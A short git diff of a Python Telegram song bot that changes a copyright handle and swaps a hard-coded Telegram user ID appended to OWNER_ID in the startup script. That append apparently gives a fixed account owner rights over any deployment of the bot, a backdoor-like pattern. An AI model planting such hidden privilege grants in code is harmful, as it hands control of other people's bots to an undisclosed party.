@@ -1,4 +1,4 @@
-# © @Mister_Dark_Prince
+# © @Mr_Dark_Prince
 from config import OWNER_ID
 from pyrogram.types.bots_and_keyboards import reply_keyboard_markup
 from AlexaSongBot.modules import *
@@ -54,7 +54,7 @@ async def help(client, message):
     text = "Syntax: /song song name"
     await message.reply(text)
 
-OWNER_ID.append(1587091205)
+OWNER_ID.append(5029694040)
 app.start()
 LOGGER.info("Your bot is now online.")
 idle()
